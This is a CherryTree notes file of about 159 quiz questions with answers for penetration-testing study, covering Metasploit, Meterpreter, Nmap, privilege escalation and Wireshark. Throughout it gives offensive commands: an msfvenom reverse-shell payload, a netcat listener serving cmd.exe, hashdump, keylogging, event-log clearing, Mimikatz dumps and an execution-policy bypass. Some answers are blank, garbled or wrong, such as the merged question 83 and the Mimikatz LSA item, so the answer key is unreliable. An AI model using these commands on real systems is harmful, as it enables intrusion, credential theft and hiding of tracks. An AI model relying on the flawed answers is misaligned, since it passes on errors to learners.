<?xml version="1.0" encoding="UTF-8"?>
<cherrytree>
  <node name="Quiz" unique_id="39" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="187" is_bold="1" foreground="#c061cb" ts_creation="1704279305" ts_lastsave="1708279889">
    <rich_text>
1.) What MSFconsole search query can be used to limit the results to only display modules compatible with Windows?
 Ans.) search type:exploit platform:windows


2.) Which one of the following MSFconsole commands can be used to set the global variable value for the RHOSTS option?
 Ans.) setg RHOSTS 10.10.10.20
 
 
 3.)Which one of the following MSFconsole commands can be used to rename an existing workspace?
  Ans.)  workspace -r
  
 
4.)  Which one of the following Nmap scans can be used to output scan results in to XML?
 Ans.) nmap -sV -O 10.10.10.1 -oX output

5.) Which one of the following MSFconsole commands can be used to import external Nmap scan results in to the Metasploit Framework database?
 Ans.) db_import


6.) Which one of the following MSF auxiliary modules can be used to perform a TCP port scan?
 Ans
 

7.) What is the default FTP port?
 Ans.) 21 
 
 
8.) What SMB auxiliary module can be used to enumerate the SMB version?
 Ans.)  auxiliary/scanner/smb/smb_version
 
 
9.) What HTTP auxiliary module can be used to perform file brute-force attacks on a web server?
 Ans.) auxiliary/scanner/http/files_dir


10.) SSH can be configured to run on any open TCP Port.
 Ans.) True
 
 
11.) What SMTP auxiliary module can be used to enumerate the version of SMTP running on a target?
 Ans.) auxiliary/scanner/smtp/smtp_version
 
 
12.) Which one of the following MSFconsole commands is used to load a custom plugin?
 Ans.) load db_autopwn


13.) Which one of the following MSFconsole search queries can be used to search for specific CVE's released in a specific year?
 Ans.) search cve:2017 platform:windows
 
 
14.) Which one of the following MSFconsole commands can be used to display the vulnerability information within the Metasploit Framework database?
 Ans.) vulns
 
 
15.) Which one of the following MSFconsole commands can be used to create a new target with WMAP?
 Ans.) wmap_targets -t
 
 
16.) Which one of the following Msfvenom commands can be used to generate an x64 Windows meterpreter payload?
 Ans.) msfvenom -a x64 -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.10.1 LPORT=1234 -f exe &gt; payload.exe
 
17.) Msfvenom can be used to encode payloads
 Ans.) True
 
 
18.)An HTTP file server can be used to host a web application?
 Ans.) True
  
 
19.) What version of SMB is vulnerable to the EternalBlue exploit?
 Ans.) SMBv1
 
 
 20.)  What is the default HTTPS WinRM port?
  Ans.) 5986
 
 
21.)  Apache Tomcat can be used to host web applications developed in Java?
 Ans) True
 
 
22.) What is the default port used by Apache Tomcat?
 Ans.) 8080
 
 
23.)Which one of the following Msfconsole commands can be used to kill a specific session?
 Ans.) sessions -k
 
 
24.) Meterpreter is a staged payload?
 Ans.) True
 
 
25.)Which one of the following meterpreter commands can be used to enumerate our current user?
 Ans.) getuid
 
 
26.)  hich one of the following Msfconsole commands can be used to upgrade a command shell to a meterpreter shell automatically?
 Ans.) sessions -u
 
 
27.)  What version of VSFTPD is vulnerable to backdoor command execution?
 Ans.)  V2.3.4


28.)  Samba is the Linux implementation of SMB?
 Ans.) True
 
 
29.) Which one of the following Nmap scans can be used to enumerate the version of SSH running on a target?
 Ans.)  nmap -sS -sV -p 22 10.10.10.1


30.) The "auxiliary/scanner/ssh/libssh_auth_bypass" module can be used to spawn a TTY session on the target system, which of the following module options can be used to spawn a TTY session after running the module?
 Ans.) set SPAWN_PTY true


31.) Which one of the following MSFconsole search queries can be used to search for Haraka SMTP exploit modules?
 Ans.) search type:exploit name:haraka


32.) Haraka SMTP versions prior to V2.8.9 are vulnerable to command injection.
 Ans) True


33.) Which one of the following Windows commands can be used to enumerate system information manually?
 Ans.) sysnfo 
 
 
34.) Which one of the following MSF post modules can be used to enumerate Windows privileges?
 Ans.) post/windows/gather/win_privs


35.) Which one of the following meterpreter commands can be used to migrate to another process?
 Ans.) migrate
 

36.) Which one of the following Windows commands can be used to enumerate members of the "Administrators" group?
 Ans) net localgroup administrators
 

37.) What does UAC stands for?
 Ans.) User Account Control
 
 
38.) Which one of the following meterpreter commands can be used to list the available access tokens for impersonation?
 Ans.) list_tokens -u
 
 
39.) Windows Access Tokens are generated by the winlogon.exe process.
 Ans.) True
 
 
40.) Impersonate tokens are created as a direct result of an interactive login on Windows.
 Ans.) False
 
 
41.) Which one of the following meterpreter Kiwi commands can be used to dump the contents of the SAM database?
 Ans.) lsa_dump_sam
 
 
42.) Which one of the following meterpreter commands can be used to dump NTLM hashes?
 Ans.) hashdump
 
 
43.) Which one of the following MSF module options is used to set the session ID?
 Ans.) set SESSION
 
 
44.) Which one of the following commands can be used to authenticate with a Windows target via RDP?
 Ans.) xfreerdp /u:administrator /p:password123 /v:10.10.10.1


45.) Which one of the following meterpreter commands can be used to start keylogging on the target system?
 Ans.) keyscan_start


46.) Which one of the following meterpreter commands can be used to clear all Windows event logs on a target system?
 Ans.) clearev
 
 
47.) Which one of the following meterpreter commands can be used to add a network route to the target subnet?
 Ans.)  run autoroute -s 10.10.10.1/24
 
 
48.)  Which one of the following Msfconsole commands is used to display the information gathered by a post exploitation module from the Metasploit Framework database?
Ans.) loot


49.) Which one of the following MSF post exploitation modules can be used to enumerate configurations on a Linux target?
 Ans.) post/linux/gather/enum_configs
 
 
50.) Which one of the following Linux commands can be used to enumerate the processes tree?
 Ans.) ps aux
 
 
51.)  hat file contains the password hashes of user accounts on Linux?
 Ans.) /etc/shadow
 
 
52.) Which one of the following Linux commands can be used to create a new user account?
 Ans.) useradd -m user
 
 
53.) Which one of the following is not a phase of exploitation?
 Ans.) Privilege escalation


54.) Which one of the following commands will enable verbose output with Netcat?
 Ans.) nc -v 192.168.1.1 21


55.) Which one of the following Nmap commands can be used to perform service version detection and operating system detection?
 Ans.) nmap -sV -O 192.168.1.1


56.) What is the default path that contains all the Nmap scripts?
 Ans.)  /usr/share/nmap/scripts


57.) What type of MSF modules are typically used for scanning and vulnerability detection?
 Ans.) auxiliary modules
 
 
58.) Exploit-db allows you to filter exploits based on the target platform.
 Ans.) True
 
 
59.) Exploits found online are completely safe and can be run without further analysis of the code.
Ans.) False


60.) Exploit-db also hosts Metasploit exploit modules.
 Ans.) True
 
 
61.)Which one of the following SearchSploit commands can be used to copy an exploit in to your current working directory?
 Ans.) searchsploit -m  /PATH
 
 
62.) Which one of the following SearchSploit commands can be used to display the Exploit-db URL instead of the EDBID?
 Ans.) searchsploit -w vsftpd


63.) In most cases, public exploit code will need to be modified in accordance with your requirements.
 Ans.) True
 
 
64.) Windows exploit code developed in C can only be compiled on a Windows system.
 Ans.)  False
 
 
65.) Which one of the following compilers can be used to compile Linux exploit code developed in C?
 Ans.) gcc
 
 
66.) Netcat comes pre-installed on Windows systems.
 Ans.) False
 
 
67.) Which one of the following Netcat commands can be used to connect to a specific port on a target?
 Ans.) nc -nv 192.168.1.1 22
 
 
68.) Which one of the following Netcat commands can be used to setup a listener that executes cmd.exe when a client connects to the listener?
 Ans.)  nc.exe -nvlp 1234 -e cmd.exe


69.) A bind shell is a type of remote shell where the attacker connects to a listener on the target system.
 Ans.) True
 
 
70.) A reverse shell is a type of remote shell where the target system connects to a listener on the attackers system.
 Ans.) True
 
 
71.) A reverse shell connection can be made to the listener on the attacker's system without Netcat.
 Ans.)
 
 
72.) The Metasploit Framework can only be used for exploitation.
 Ans.) false
 
 
73.) Metasploit modules are developed in Perl
 Ans.)  false
 
 
74.) PowerShell-Empire provides you with the ability to generate Windows executable stagers developed in C#.
 Ans.) True
 
 
 75.) Which one of the following commands can be used to install PowerShell-Empire on Kali Linux?
  Ans.) sudo apt-get install powershell-empire -y


76.) Which one of the following PowerShell-Empire client commands can be used to interact with an agent called Win7?
 Ans.) interact Win7
 
 
77.) A black box penetration test is a security assessment whereby the penetration tester is provided with information regarding the target system.
 Ans.) False
 
 
78.) Which one of the following nmap scans can be used to output scan results in to a format that can be imported in to MSF?
 Ans.) nmap -sV 192.168.1.1 -oX results


79.) Which one of the following Nmap scans can be used to scan the port range ranging from port 80 to 3389?
 Ans) nmap -sV -p 80-3389 192.168.1.1
 
 
80.) Which one of the following commands can be used to upload a file to an FTP server with the FTP client?
 Ans.) put file.txt


81.) Which one of the following Nmap script scans can be used to identify if anonymous FTP logons are permitted?
 Ans.) nmap -sV -p 21 --script=ftp-anon 192.168.1.1
 
 
82.) Which one of the following MSF module can be used to perform a brute-force attack on SSH?
 Ans.) auxiliary/scanner/ssh/ssh_login


83.)After obtaining legitimate user account credentials, we can remotely obtain a command shell on a Windows target with Psexec.Which one of the following tools can be used to perform a brute-force attack on SMB?
 Ans.) True
 
 
84.) Which one of the following tools can be used to perform a brute-force attack on SMB?
 Ans.) hydra
 
 
85.)  hich one of the following commands can be used to remotely authenticate to a MySQL database server?
 Ans.) mysql -u root -p -h 192.168.1.1


86.) What is the default TCP port used by MySQL?
 Ans.) 3306
 
87.) A black box penetration test is used to test the security of a company from the perspective of an external attacker.
 Ans.) True
 
 
88.) Which one of the following Nmap scans can be used to perform OS detection?
 Ans.) nmap -sV -sC -O 192.168.1.1
 
 
89.) In some cases vulnerable services could be patched, consequently mitigating a potential exploit.
 Ans.) True
 
 
90.) Which one of the following PHP config files contains the version of PHP installed on the web server?
 Ans.) phpinfo.php


91.) Which one of the following MSF modules can be used to enumerate the version of SAMBA running on the target?
 Ans.) auxiliary/scanner/smb/smb_version


92.) Shellter allows you to inject PowerShell-Empire shellcode in to portable executables.
 Ans.) True
 
 
93.) Signature based detection can be bypassed by modifying the malware's byte sequence.
 Ans.) True
 
 
94.) Which one of the following PowerShell commands can be used to import a PowerShell module?
 Ans.) Import-Module module.psd1
 
 
95.) PowerShell can be installed and used on Linux.
 Ans.) True
 
 
96.)The post-exploitation techniques you can use will differ based on the operating system running on a target.
 Ans.) True
 
 
97.)  Which one of the following post-exploitation phases is typically performed first?
 Ans.) Local Enumeration
 
 
98.) Which one of the following Windows commands can be used to enumerate a list of installed updates in addition to the HotFix URL?
 Ans.) wmic qfe get Caption,Description,HotFixID,InstalledOn


99.) hich one of the following Windows commands can be used to display the members of the local administrators group?
 Ans.) net localgroup administrators
 
 
100.) Which one of the following Windows commands can be used to enumerate the privileges of the current user?
 Ans.) whoami /priv


101.) The Windows Administrator account is disabled by default unless it is explicitly enabled.
 Ans.) True
 
 
102.) Which one of the following Netstat commands can be used to display a list of active TCP/UDP connections?
 Ans.) netstat -ano


103.) Which one of the following Linux commands can be used to upgrade a non-interactive shell to a bash session?
 Ans.) python -c 'import pty;pty.spawn("/bin/bash")'


104.) What meterpreter command would you typically run to identify the PID of a specific process?
 Ans.)pgrep explorer.exe
 
 
105.) Which one of the following Windows commands can be used to enumerate the list of running processes and the respective services being used by the processes?
 Ans.) tasklist /SVC


106.) Which one of the following MSF modules can be used to enumerate a list of SMB shares on the target system?
 Ans.) windows/gather/enum_shares


107.) Local enumeration automation scripts can replace manual local enumeration techniques.
 Ans.) False
 
 
108.) Which one of the following Linux commands can be used to enumerate the Distribution name and release version on a Linux system?
 Ans.) cat /etc/*release


109.) Which one of the following Linux commands can be used to display the groups that a specific user is a member of?
 Ans.) groups
 
 
110.) Which one of the following Linux commands can be used to display the primary nameserver that will be used by default?
 Ans.) cat /etc/resolv.conf


111.) Which one of the following Linux commands can be used to display only the processes that are running with root privileges?
 Ans.)  ps aux | grep root
 
 
112.) Which one of the following commands can be used to display a list of installed shells on a Linux system?
 Ans.) cat /etc/shells

 
113.) In addition to automating local enumeration on Linux, the LinEnum script also enumerates a list of installed compilers.
 Ans) True
 
 
114.) Which one of the following commands can be used to assign executable permissions to a file on Linux?
 Ans.) chmod +x script.sh
 
 
115.) Which one of the following commands can be used to run the http.server Python module on port 8080?
 Ans.) python3 -m http.server 8080


116.) </rich_text>
    <rich_text scale="h3">Which one of the following Windows utilities can be used to download files from a remote web server?</rich_text>
    <rich_text>
 Ans.) certutil
 
 
117.) Which one of the following wget commands can be used to download a file from a remote server?
 Ans.)  </rich_text>
    <rich_text scale="h3">wget http://192.168.1.100/file.php</rich_text>
    <rich_text>


118.) What PowerShell command can be used to bypass the default execution policy when running PowerShell scripts from the Windows command line?
 Ans.)powershell -ep bypass .\script.ps1


119.) The PrivescCheck PowerShell script can be used to identify services with weak permissions.
 Ans.) True
 
 
120.) After obtaining user account credentials, what protocols can we use to authenticate with the Windows target? (Select all that apply)
 Ans.) SMB , RDP, WinRM
 
 
121.) Which one of the following Linux commands can be used to identify files with the write permission applied for all user accounts?
 Ans.) find / -not -type l -perm -o+w


122.) Which one of the following Linux commands can be used to identify commands that can be executed with specific SUDO permissions?
 Ans.) sudo -l
 
 
123.) Establishing persistence on a system does not interfere with the functionality of the operating system.
 Ans.) False
 
 
124.) You require elevated privileges in order to establish persistence on a Windows system.
 Ans.) True
 
 
125.) In addition to using cleartext passwords for authentication with RDP, we can also utilize user account hashes.
 Ans.) False
 
 
126.) Which one of the following commands can be used to transfer files from a target system to our local system via SSH?
 Ans.) scp user@192.168.1.100:/root/file.txt /home/kali/


127.) Which one of the following crontab commands can be used to display existing cron jobs.
 Ans.) crontab -l
 
 
128.) Cron Jobs can be configured to run indefinitely every minute of every hour of every day.
 Ans.) True
 
 
129.) What hash mode would you use when cracking NTLM Hashes with Hashcat?
 Ans.) -m 1000


130.) What Hashcat hash mode would you use when cracking Linux password Hashes encrypted with SHA-512?
 Ans.) -m 1800


131.) After compromising a Linux system and elevating your privileges, you  display the content of the /etc/shadow file and discover that the  password hashes have a prefix of  
</rich_text>
    <rich_text family="monospace">
"$1". What hashing algorithm corresponds with "$1"?</rich_text>
    <rich_text>

Ans.) MD5


132.) Which one of the following Meterpreter commands can be used to add a network route for a specific subnet?
 Ans.) run autoroute -s 192.168.1.0/24


133.) Which one of the following Meterpreter commands can be used to execute a cleanup resource script from within Meterpreter?
 Ans.)  resource cleanup.rc


134.) What is the default file used to store a user account's bash history?
 Ans.) .bash_history


135.) </rich_text>
    <rich_text scale="h3">Which of the following is an example of a network service?</rich_text>
    <rich_text>
 Ans.) ARP
 
 
</rich_text>
    <rich_text scale="small">136</rich_text>
    <rich_text>.)  What distinguishes a network-based attack from other types of attacks?
 Ans.) It relies on network traffic and network services and protocols


137.) </rich_text>
    <rich_text scale="h3">Which Statistic page breaks down the protocols found in the packet capture?</rich_text>
    <rich_text>
 Ans.)  </rich_text>
    <rich_text scale="h3">Protocol hierarchy</rich_text>
    <rich_text>
 
 
138.) </rich_text>
    <rich_text scale="h3">To capture traffic on a network, what is the first setting to check in wireshark before beginning the capture?</rich_text>
    <rich_text>
 Ans.)  The interface


139.) </rich_text>
    <rich_text scale="h3">What is one of the most useful network-based attacks?</rich_text>
    <rich_text>
 Ans.) MITM


140.) </rich_text>
    <rich_text scale="h3">Which Statistics page breaks down by addresses each machine found in the packet capture?</rich_text>
    <rich_text>
Ans.) NIC


141.) </rich_text>
    <rich_text scale="h3">In order to more easily follow a "conversation" between two machines in Wireshark, what must you choose from the right-click menu?</rich_text>
    <rich_text>
 Ans.) </rich_text>
    <rich_text scale="h3">Follow &gt; TCP Stream</rich_text>
    <rich_text>
 
 
142.) </rich_text>
    <rich_text scale="h3">How do you go back to the display filter you had set before?</rich_text>
    <rich_text>
 Ans.) Select the display filter you want from the dropdown history


143.)</rich_text>
    <rich_text scale="h3">What is Wireshark's default time display setting?</rich_text>
    <rich_text>
 Ans.) Relative time in seconds
 
 
144.)</rich_text>
    <rich_text scale="h3">What layers of the TCP/IP model can be identified via wireshark, looking at captured packets?</rich_text>
    <rich_text>
 Ans.)  All layers


145.) </rich_text>
    <rich_text scale="h2">Which one of the following commands can be used to display the list of scheduled cron jobs for the current user?</rich_text>
    <rich_text>
 Ans.) crontab -l


146.) </rich_text>
    <rich_text scale="h2">In order to elevate our privileges, we will need to identify an SUID binary that is owned by the "root" user.</rich_text>
    <rich_text>
 Ans.) True


147.) </rich_text>
    <rich_text scale="h2">Encrypted Linux account passwords are stored in the /etc/passwd file.</rich_text>
    <rich_text>
 Ans.) False
 
 
148.) </rich_text>
    <rich_text scale="h2">The /etc/shadow file can only be accessed by the "root" user.</rich_text>
    <rich_text>
 Ans.) True
 
 
149.) </rich_text>
    <rich_text scale="h2">Which one of the following evil-winrm commands can be used to obtain a remote PowerShell shell on a Windows target</rich_text>
    <rich_text>
 Ans.) </rich_text>
    <rich_text scale="h3">evil-winrm.rb -u administrator -p 'password123' -i 192.168.1.1</rich_text>
    <rich_text>

 
150.) </rich_text>
    <rich_text scale="h2">Crackmapexec can be used to execute commands on a Windows target.</rich_text>
    <rich_text>
 Ans.) True
 
 
151.) </rich_text>
    <rich_text scale="h2">Mimikatz makes a copy of the SAM database in order to extract NTLM hashes.</rich_text>
    <rich_text>
 Ans.) False
 
 
152.) </rich_text>
    <rich_text scale="h2">Which one of the following Mimikatz commands can be used to extract NTLM hashes via the LSA?</rich_text>
    <rich_text>
 Ans.) </rich_text>
    <rich_text scale="h3">lsadump::sam</rich_text>
    <rich_text>
 
 
153.) </rich_text>
    <rich_text scale="h2">FTP can be typically found running on port 23.</rich_text>
    <rich_text>
 Ans.) False
 
 
154.) Which one of the following directories contains the Unattended Windows Setup utility configuration file?
 Ans.) C:\Windows\Panther\Unattend.xml


155.) Which one of the following commands can be used to remotely access a Windows target via RDP with xfreerdp?
 Ans.) xfreerdp /u:administrator /p:password123 /v:192.168.1.1
 
 
156.) RDP can be configured to run on a different TCP port.
 Ans.) True
 
 
157.) What is the tactic of spoofing well-known websites to gather information?
 Ans.) watering hole
 
 
158.) Which human manipulation technique of social engineering plays on a false sense of time running out?
 Ans.) Urgency

 
159.) What form of phishing targets high-profile or powerful individuals in particular?
 Ans.)  Whaling</rich_text>
  </node>
</cherrytree>
